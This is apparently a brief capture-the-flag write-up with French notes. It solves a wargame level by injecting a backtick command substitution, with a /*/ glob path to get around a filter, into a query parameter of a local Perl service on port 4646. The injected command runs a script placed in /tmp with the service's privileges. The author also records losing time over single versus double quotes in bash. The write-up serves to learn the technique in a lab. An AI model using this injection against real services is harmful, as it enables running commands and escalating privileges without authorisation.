```
echo "getflag" > /tmp/GETFLAG
touch /tmp/CC
chmod 777 /tmp/GETFLAG
```
```
curl localhost:4646/?x="`/*/GETFLAG>/*/CC`"
```

Ne marche pas (lance check flag sans les droits).

Comment perdre 1h15: mettre des "" a la place de '' et ne pas comprendre pourquoi level12.pl lance sans les droits.
https://stackoverflow.com/questions/6697753/difference-between-single-and-double-quotes-in-bash
https://www.howtogeek.com/howto/29980/whats-the-difference-between-single-and-double-quotes-in-the-bash-shell/

```
cat /tmp/GETFLAG
#!/bin/bash
getflag > /tmp/mdp

chmod 777 /tmp/GETFLAG

curl localhost:4646?x='`/*/GETFLAG`' 
```

